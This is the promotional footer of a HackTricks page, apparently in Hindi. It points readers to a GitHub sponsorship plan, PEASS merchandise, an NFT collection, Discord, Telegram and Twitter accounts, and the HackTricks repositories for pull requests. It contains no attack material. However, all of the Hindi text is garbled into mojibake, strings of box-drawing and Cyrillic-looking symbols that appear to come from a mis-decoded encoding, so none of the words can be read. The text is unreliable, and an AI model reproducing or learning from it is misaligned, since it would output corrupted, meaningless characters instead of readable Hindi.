* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рди**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдБрдЪ рдХрд░реЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рдХрд▓реЗрдХреНрд╢рди, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдЦреЛрдЬреЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рд╣рдореЗрдВ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** рдкрд░ **рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github рд░реЗрдкреЛ рдореЗрдВ PR рдЬрдорд╛ рдХрд░рдХреЗред

</details>
